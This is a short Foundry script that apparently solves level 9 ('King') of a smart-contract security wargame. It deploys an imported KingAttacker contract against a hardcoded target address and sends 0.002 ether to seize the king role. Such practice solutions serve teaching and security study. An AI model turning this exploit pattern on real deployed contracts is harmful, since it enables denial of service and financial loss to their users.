// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/9-King.sol";
import "../levels/9-King.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    function run() external{
        vm.startBroadcast();

        // Create KingAttacker instance
        KingAttacker kingAttacker = new KingAttacker(payable(0xcd2588a61f1111fA29Fa61F4184FF7d7452aeB03));

        // Become king
        kingAttacker.becomeKing{value: .002 ether}();

        vm.stopBroadcast();
    }
}